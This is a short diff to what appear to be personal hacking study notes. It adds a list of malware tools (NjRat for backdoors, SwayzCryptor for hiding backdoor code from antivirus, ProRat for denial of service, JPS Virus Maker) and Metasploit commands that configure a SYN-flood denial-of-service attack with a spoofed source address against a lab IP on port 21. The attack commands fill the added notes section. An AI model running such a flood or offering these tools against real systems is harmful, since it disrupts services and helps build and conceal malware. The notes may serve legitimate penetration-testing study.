@@ -1,4 +1,14 @@
+TOOLS ---
+
 NjRat -- Create backdoor 
 SwayzCryptor --encrypt backdoor source code to bypass anti-virus dectecion
 ProRat ---For DOS attacks
 JPS Virus Maker Tool --Create virus
+
+
+NOTES ----
+
+use auxiliary/dos/tcp/synflood --dos 
+set RHOST (Target IP Address) (here, 10.10.10.10)
+set RPORT 21
+set SHOST (Spoofable IP Address) (here, 10.10.10.19)
